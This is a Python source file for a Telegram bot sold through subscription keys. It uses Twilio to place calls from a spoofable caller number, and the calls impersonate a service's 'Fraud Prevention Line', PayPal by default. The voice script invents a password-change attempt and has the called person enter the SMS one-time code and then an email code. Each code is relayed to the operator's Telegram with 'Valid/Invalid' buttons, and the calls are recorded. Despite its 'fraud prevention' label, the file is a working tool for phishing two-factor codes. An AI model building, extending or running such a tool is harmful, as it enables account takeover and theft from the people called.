import os
import sqlite3
import secrets
import logging
import string
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse
from flask import Flask, request
import threading

# ============================================================================
# CONFIGURATION
# ============================================================================

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = int(os.getenv("TELEGRAM_CHAT_ID"))
TWILIO_ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID")
TWILIO_AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN")
TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER")
RENDER_URL = os.getenv("RENDER_URL")
ADMIN_USER_ID = TELEGRAM_CHAT_ID

# ============================================================================
# LOGGING
# ============================================================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================================
# DATABASE SETUP
# ============================================================================

DB_FILE = "subscription.db"
CALLS_FILE = "calls_data.json"

def init_database():
    """Initialize SQLite database"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_code TEXT UNIQUE NOT NULL,
            duration TEXT NOT NULL,
            status TEXT DEFAULT 'active',
            created_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            redeemed_by_name TEXT,
            redeemed_by_username TEXT,
            redeemed_by_id INTEGER,
            redemption_date TIMESTAMP,
            expiration_date TIMESTAMP
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER UNIQUE NOT NULL,
            username TEXT,
            first_name TEXT,
            key_code TEXT,
            redemption_date TIMESTAMP,
            expiration_date TIMESTAMP,
            status TEXT DEFAULT 'active',
            FOREIGN KEY (key_code) REFERENCES keys(key_code)
        )
    """)
    
    conn.commit()
    conn.close()
    logger.info("✅ Database initialized")

def init_calls_storage():
    """Initialize calls data storage"""
    if not os.path.exists(CALLS_FILE):
        with open(CALLS_FILE, 'w') as f:
            json.dump({}, f)

# ============================================================================
# CALL STATE MANAGEMENT
# ============================================================================

def save_call_state(call_sid, state_data):
    """Save call state to JSON file"""
    try:
        with open(CALLS_FILE, 'r') as f:
            calls = json.load(f)
        
        calls[call_sid] = state_data
        
        with open(CALLS_FILE, 'w') as f:
            json.dump(calls, f, indent=2)
        
        logger.info(f"✅ Call state saved: {call_sid}")
    except Exception as e:
        logger.error(f"❌ Error saving call state: {str(e)}")

def get_call_state(call_sid):
    """Get call state from JSON file"""
    try:
        with open(CALLS_FILE, 'r') as f:
            calls = json.load(f)
        
        return calls.get(call_sid, {})
    except Exception as e:
        logger.error(f"❌ Error getting call state: {str(e)}")
        return {}

def update_call_state(call_sid, updates):
    """Update call state"""
    try:
        state = get_call_state(call_sid)
        state.update(updates)
        save_call_state(call_sid, state)
    except Exception as e:
        logger.error(f"❌ Error updating call state: {str(e)}")

# ============================================================================
# KEY MANAGEMENT FUNCTIONS
# ============================================================================

def generate_key(duration):
    """Generate cryptographically secure key"""
    characters = string.ascii_letters + string.digits
    key = ''.join(secrets.choice(characters) for _ in range(32))
    return key

def create_key(duration_str):
    """Create new key in database"""
    key_code = generate_key(duration_str)
    
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO keys (key_code, duration, status)
            VALUES (?, ?, 'active')
        """, (key_code, duration_str))
        
        conn.commit()
        conn.close()
        
        logger.info(f"✅ Key created: {key_code} ({duration_str})")
        return key_code
    except Exception as e:
        logger.error(f"❌ Error creating key: {str(e)}")
        return None

def redeem_key(key_code, user_id, username, first_name):
    """Redeem key for user"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM keys WHERE key_code = ? AND status = 'active'", (key_code,))
        key = cursor.fetchone()
        
        if not key:
            conn.close()
            return False, "❌ Invalid or already used key"
        
        cursor.execute("SELECT * FROM users WHERE user_id = ? AND status = 'active'", (user_id,))
        existing_user = cursor.fetchone()
        
        if existing_user:
            conn.close()
            return False, "❌ You already have an active subscription"
        
        duration_str = key[2]
        if duration_str == "24h":
            expiration = datetime.now() + timedelta(hours=24)
        elif duration_str == "7d":
            expiration = datetime.now() + timedelta(days=7)
        elif duration_str == "30d":
            expiration = datetime.now() + timedelta(days=30)
        else:
            conn.close()
            return False, "❌ Invalid key duration"
        
        cursor.execute("""
            UPDATE keys 
            SET status = 'used', 
                redeemed_by_name = ?, 
                redeemed_by_username = ?, 
                redeemed_by_id = ?,
                redemption_date = CURRENT_TIMESTAMP,
                expiration_date = ?
            WHERE key_code = ?
        """, (first_name, username, user_id, expiration.isoformat(), key_code))
        
        cursor.execute("""
            INSERT INTO users (user_id, username, first_name, key_code, redemption_date, expiration_date, status)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, ?, 'active')
        """, (user_id, username, first_name, key_code, expiration.isoformat()))
        
        conn.commit()
        conn.close()
        
        return True, f"✅ Key redeemed! Expires: {expiration.strftime('%b %d, %Y at %H:%M')}"
    except Exception as e:
        logger.error(f"❌ Error redeeming key: {str(e)}")
        return False, f"❌ Error: {str(e)}"

def check_subscription(user_id):
    """Check user subscription"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT expiration_date, status FROM users 
            WHERE user_id = ? AND status = 'active'
        """, (user_id,))
        
        result = cursor.fetchone()
        conn.close()
        
        if not result:
            return False, None
        
        expiration_date = datetime.fromisoformat(result[0])
        now = datetime.now()
        
        if expiration_date < now:
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute("UPDATE users SET status = 'expired' WHERE user_id = ?", (user_id,))
            conn.commit()
            conn.close()
            return False, None
        
        remaining = expiration_date - now
        days = remaining.days
        hours = remaining.seconds // 3600
        minutes = (remaining.seconds % 3600) // 60
        
        return True, {
            "expiration": expiration_date,
            "days": days,
            "hours": hours,
            "minutes": minutes
        }
    except Exception as e:
        logger.error(f"❌ Error checking subscription: {str(e)}")
        return False, None

def get_all_keys():
    """Get all keys"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT key_code, duration, status, redeemed_by_name, redeemed_by_username, expiration_date
            FROM keys
            ORDER BY created_date DESC
        """)
        
        keys = cursor.fetchall()
        conn.close()
        return keys
    except Exception as e:
        logger.error(f"❌ Error getting keys: {str(e)}")
        return []

def revoke_key(key_code):
    """Revoke key"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute("UPDATE keys SET status = 'revoked' WHERE key_code = ?", (key_code,))
        cursor.execute("UPDATE users SET status = 'revoked' WHERE key_code = ?", (key_code,))
        
        conn.commit()
        conn.close()
        logger.info(f"✅ Key revoked: {key_code}")
    except Exception as e:
        logger.error(f"❌ Error revoking key: {str(e)}")

def suspend_user(user_id):
    """Suspend user"""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute("UPDATE users SET status = 'suspended' WHERE user_id = ?", (user_id,))
        
        conn.commit()
        conn.close()
        logger.info(f"✅ User suspended: {user_id}")
    except Exception as e:
        logger.error(f"❌ Error suspending user: {str(e)}")

# ============================================================================
# TELEGRAM BOT HANDLERS
# ============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user = update.effective_user
    is_admin = user.id == ADMIN_USER_ID
    
    message = f"""
🤖 **Welcome to PayPal Fraud Prevention Bot**

This bot allows you to make automated calls for fraud prevention verification.

**Available Commands:**
• `/redeem <key>` - Redeem your subscription key
• `/subscription` - Check your subscription status
• `/call <number> <from> <name> <service>` - Make a call (requires active subscription)
• `/help` - Show help
"""
    
    if is_admin:
        message += """
**Admin Commands:**
• `/genkey <duration>` - Generate a key (24h, 7d, 30d)
• `/admin` - View admin panel
• `/revoke <key>` - Revoke a key
• `/suspend <user_id>` - Suspend a user
"""
    
    message += "\nFor more information, use `/help`"
    
    await update.message.reply_text(message, parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    user = update.effective_user
    is_admin = user.id == ADMIN_USER_ID
    
    message = """
📖 **HELP GUIDE**

**Available Commands:**

1️⃣ **Redeem a Key**
   `/redeem YOUR_KEY_CODE`
   
2️⃣ **Check Subscription**
   `/subscription`
   
3️⃣ **Make a Call**
   `/call +1234567890 +12566967661 John Smith PayPal`
   
   Format: `/call <customer_number> <your_number> <customer_name> <service_name>`
"""
    
    if is_admin:
        message += """

**Admin Commands:**

1️⃣ **Generate Keys**
   `/genkey 24h` - 24-hour key
   `/genkey 7d` - 7-day key
   `/genkey 30d` - 30-day key
   
2️⃣ **View Admin Panel**
   `/admin` - See all keys and users
   
3️⃣ **Revoke a Key**
   `/revoke KEY_CODE`
   
4️⃣ **Suspend a User**
   `/suspend USER_ID`
"""
    
    await update.message.reply_text(message, parse_mode="Markdown")

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate key (admin only)"""
    user = update.effective_user
    
    if user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized. Only the admin can generate keys.")
        return
    
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: `/genkey <24h|7d|30d>`", parse_mode="Markdown")
        return
    
    duration = context.args[0].lower()
    
    if duration not in ["24h", "7d", "30d"]:
        await update.message.reply_text("❌ Invalid duration. Use: 24h, 7d, or 30d")
        return
    
    key_code = create_key(duration)
    
    if not key_code:
        await update.message.reply_text("❌ Error generating key. Please try again.")
        return
    
    message = f"""
✅ **Key Generated Successfully!**

🔑 **Key Code:** `{key_code}`
⏱️ **Duration:** {duration}
📅 **Created:** {datetime.now().strftime('%b %d, %Y at %H:%M')}

Share this key with users. They can redeem it with:
`/redeem {key_code}`
    """
    await update.message.reply_text(message, parse_mode="Markdown")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem key"""
    user = update.effective_user
    
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: `/redeem YOUR_KEY_CODE`", parse_mode="Markdown")
        return
    
    key_code = context.args[0]
    success, message = redeem_key(key_code, user.id, user.username or "Unknown", user.first_name)
    
    if success:
        await update.message.reply_text(message, parse_mode="Markdown")
        admin_msg = f"✅ User {user.first_name} (@{user.username}) redeemed key: {key_code}"
        try:
            await context.bot.send_message(chat_id=ADMIN_USER_ID, text=admin_msg)
        except:
            pass
    else:
        await update.message.reply_text(message)

async def subscription(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check subscription"""
    user = update.effective_user
    
    has_sub, sub_info = check_subscription(user.id)
    
    if not has_sub:
        await update.message.reply_text(
            "❌ No active subscription. Use `/redeem <key>` to activate.",
            parse_mode="Markdown"
        )
        return
    
    message = f"""
✅ **Active Subscription**

👤 **User:** {user.first_name}
📅 **Expires:** {sub_info['expiration'].strftime('%b %d, %Y at %H:%M')}
⏱️ **Time Remaining:** {sub_info['days']} days, {sub_info['hours']} hours, {sub_info['minutes']} minutes
    """
    await update.message.reply_text(message, parse_mode="Markdown")

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin panel"""
    user = update.effective_user
    
    if user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized. Only the admin can access this.")
        return
    
    keys = get_all_keys()
    
    if not keys:
        await update.message.reply_text("📊 **Admin Panel**\n\nNo keys found.", parse_mode="Markdown")
        return
    
    message = "📊 **Admin Panel - All Keys**\n\n"
    
    for key in keys:
        key_code, duration, status, redeemed_by_name, redeemed_by_username, expiration_date = key
        
        status_emoji = "🟢" if status == "active" else "🔴" if status == "used" else "⛔"
        
        if status == "used":
            message += f"{status_emoji} `{key_code}` ({duration})\n"
            message += f"   User: {redeemed_by_name} (@{redeemed_by_username})\n"
            message += f"   Expires: {expiration_date}\n\n"
        else:
            message += f"{status_emoji} `{key_code}` ({duration}) - {status.upper()}\n\n"
    
    await update.message.reply_text(message, parse_mode="Markdown")

async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Revoke key"""
    user = update.effective_user
    
    if user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: `/revoke KEY_CODE`", parse_mode="Markdown")
        return
    
    key_code = context.args[0]
    revoke_key(key_code)
    
    await update.message.reply_text(f"✅ Key `{key_code}` has been revoked.", parse_mode="Markdown")

async def suspend(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Suspend user"""
    user = update.effective_user
    
    if user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    if not context.args or len(context.args) != 1:
        await update.message.reply_text("Usage: `/suspend USER_ID`", parse_mode="Markdown")
        return
    
    try:
        user_id = int(context.args[0])
        suspend_user(user_id)
        await update.message.reply_text(f"✅ User `{user_id}` has been suspended.", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")

# Global variable to store bot context for callbacks
bot_context = None

async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Make a call with full IVR"""
    global bot_context
    bot_context = context
    
    user = update.effective_user
    
    # Check subscription
    has_sub, sub_info = check_subscription(user.id)
    
    if not has_sub:
        await update.message.reply_text(
            "❌ No active subscription. Use `/redeem <key>` to make calls.",
            parse_mode="Markdown"
        )
        return
    
    if len(context.args) < 4:
        await update.message.reply_text(
            "Usage: `/call <customer_number> <your_number> <customer_name> <service_name>`",
            parse_mode="Markdown"
        )
        return
    
    customer_number = context.args[0]
    our_number = context.args[1]
    customer_name = context.args[2]
    service_name = " ".join(context.args[3:])
    
    # Send initial notification
    await update.message.reply_text(
        f"📞 Initiating call...\n\nFrom: {our_number}\nTo: {customer_number}\nCustomer: {customer_name}\nService: {service_name}"
    )
    
    try:
        # Initialize Twilio client
        twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
        
        # Make the call
        call = twilio_client.calls.create(
            to=customer_number,
            from_=our_number,
            url=f"{RENDER_URL}/voice",
            record=True
        )
        
        # Save call state
        call_state = {
            "call_sid": call.sid,
            "customer_number": customer_number,
            "our_number": our_number,
            "customer_name": customer_name,
            "service_name": service_name,
            "user_id": user.id,
            "initiated_at": datetime.now().isoformat(),
            "status": "initiated",
            "stage": "ringing",
            "sms_code": None,
            "sms_verified": False,
            "email_code": None,
            "email_verified": False
        }
        
        save_call_state(call.sid, call_state)
        
        # Send notification
        await update.message.reply_text(f"✅ Call initiated! Call SID: {call.sid}")
        await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=f"📞 CALL INITIATED\n\nFrom: {our_number}\nTo: {customer_number}\nCustomer: {customer_name}\nService: {service_name}"
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error initiating call:\n\n{str(e)}")
        logger.error(f"❌ Call error: {str(e)}")

# ============================================================================
# FLASK SERVER FOR TWILIO WEBHOOKS
# ============================================================================

app = Flask(__name__)

@app.route("/voice", methods=["POST"])
def voice():
    """Handle incoming calls - IVR Flow"""
    try:
        call_sid = request.form.get('CallSid')
        digits = request.form.get('Digits')
        call_status = request.form.get('CallStatus')
        
        # Get call state
        call_state = get_call_state(call_sid)
        
        if not call_state:
            call_state = {"call_sid": call_sid, "stage": "greeting"}
        
        response = VoiceResponse()
        
        # Stage 1: Greeting & Ask to Press 1
        if call_state.get("stage") == "greeting":
            customer_name = call_state.get("customer_name", "Valued Customer")
            service_name = call_state.get("service_name", "PayPal")
            
            response.say(f"Hello {customer_name}. This is the {service_name} Fraud Prevention Line. We have called because of an attempt to change your password on your {service_name} account. If this was not you, press 1.", voice="alice")
            
            response.gather(num_digits=1, action=f"{RENDER_URL}/voice", method="POST")
            
            update_call_state(call_sid, {"stage": "waiting_for_1"})
        
        # Stage 2: User pressed 1 - Ask for SMS Code
        elif call_state.get("stage") == "waiting_for_1" and digits == "1":
            response.say("To block this request, please enter the 6 digits code sent to your mobile device.", voice="alice")
            response.gather(num_digits=6, action=f"{RENDER_URL}/voice", method="POST")
            
            update_call_state(call_sid, {"stage": "waiting_for_sms_code"})
            
            # Notify admin
            if bot_context:
                try:
                    bot_context.bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text=f"🔔 CUSTOMER PRESSED 1\n\nCall SID: {call_sid}"
                    )
                except:
                    pass
        
        # Stage 3: SMS Code Received - Ask for Email Code
        elif call_state.get("stage") == "waiting_for_sms_code" and digits:
            sms_code = digits
            
            # Save SMS code
            update_call_state(call_sid, {
                "stage": "sms_code_received",
                "sms_code": sms_code
            })
            
            # Notify admin with verification buttons
            if bot_context:
                try:
                    keyboard = InlineKeyboardMarkup([
                        [
                            InlineKeyboardButton("✅ Valid", callback_data=f"sms_valid_{call_sid}"),
                            InlineKeyboardButton("❌ Invalid", callback_data=f"sms_invalid_{call_sid}")
                        ]
                    ])
                    
                    bot_context.bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text=f"🔐 SMS CODE RECEIVED\n\nCode: `{sms_code}`\n\nCall SID: {call_sid}",
                        reply_markup=keyboard,
                        parse_mode="Markdown"
                    )
                except:
                    pass
            
            response.say("Thank you. Your code has been received. Please hold while we verify.", voice="alice")
            response.pause(length=2)
            response.say("Requesting email code verification.", voice="alice")
            response.gather(num_digits=6, action=f"{RENDER_URL}/voice", method="POST")
            
            update_call_state(call_sid, {"stage": "waiting_for_email_code"})
        
        # Stage 4: Email Code Received
        elif call_state.get("stage") == "waiting_for_email_code" and digits:
            email_code = digits
            
            update_call_state(call_sid, {
                "stage": "email_code_received",
                "email_code": email_code
            })
            
            # Notify admin with verification buttons
            if bot_context:
                try:
                    keyboard = InlineKeyboardMarkup([
                        [
                            InlineKeyboardButton("✅ Valid", callback_data=f"email_valid_{call_sid}"),
                            InlineKeyboardButton("❌ Invalid", callback_data=f"email_invalid_{call_sid}")
                        ]
                    ])
                    
                    bot_context.bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text=f"📧 EMAIL CODE RECEIVED\n\nCode: `{email_code}`\n\nCall SID: {call_sid}",
                        reply_markup=keyboard,
                        parse_mode="Markdown"
                    )
                except:
                    pass
            
            response.say("Thank you. Your email code has been received. Please hold while we verify.", voice="alice")
            response.pause(length=2)
            response.say("Your verification is complete. Thank you for your cooperation. Goodbye.", voice="alice")
            response.hangup()
        
        else:
            response.say("Thank you for calling. Goodbye.", voice="alice")
            response.hangup()
        
        return str(response)
    
    except Exception as e:
        logger.error(f"❌ Voice handler error: {str(e)}")
        response = VoiceResponse()
        response.say("An error occurred. Goodbye.")
        response.hangup()
        return str(response)

@app.route("/status", methods=["POST"])
def call_status():
    """Handle call status updates"""
    try:
        call_sid = request.form.get('CallSid')
        call_status = request.form.get('CallStatus')
        
        call_state = get_call_state(call_sid)
        
        if call_status == "ringing":
            update_call_state(call_sid, {"status": "ringing"})
            if bot_context:
                try:
                    bot_context.bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text=f"📞 CALL RINGING\n\nCall SID: {call_sid}"
                    )
                except:
                    pass
        
        elif call_status == "in-progress":
            update_call_state(call_sid, {"status": "in_progress"})
            if bot_context:
                try:
                    bot_context.bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text=f"👤 HUMAN PICKED UP\n\nCall SID: {call_sid}"
                    )
                except:
                    pass
        
        elif call_status == "completed":
            update_call_state(call_sid, {"status": "completed", "ended_at": datetime.now().isoformat()})
            if bot_context:
                try:
                    bot_context.bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text=f"📞 CALL ENDED\n\nCall SID: {call_sid}"
                    )
                except:
                    pass
        
        return "", 200
    
    except Exception as e:
        logger.error(f"❌ Status handler error: {str(e)}")
        return "", 200

# ============================================================================
# MAIN APPLICATION
# ============================================================================

def main():
    """Start the bot"""
    init_database()
    init_calls_storage()
    
    if not all([TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, TWILIO_PHONE_NUMBER, RENDER_URL]):
        logger.error("❌ ERROR: Missing required environment variables!")
        return
    
    logger.info("✅ Starting Professional Bot...")
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("subscription", subscription))
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(CommandHandler("revoke", revoke))
    application.add_handler(CommandHandler("suspend", suspend))
    application.add_handler(CommandHandler("call", call_command))
    
    flask_thread = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False))
    flask_thread.daemon = True
    flask_thread.start()
    
    application.run_polling()

if __name__ == "__main__":
    main()
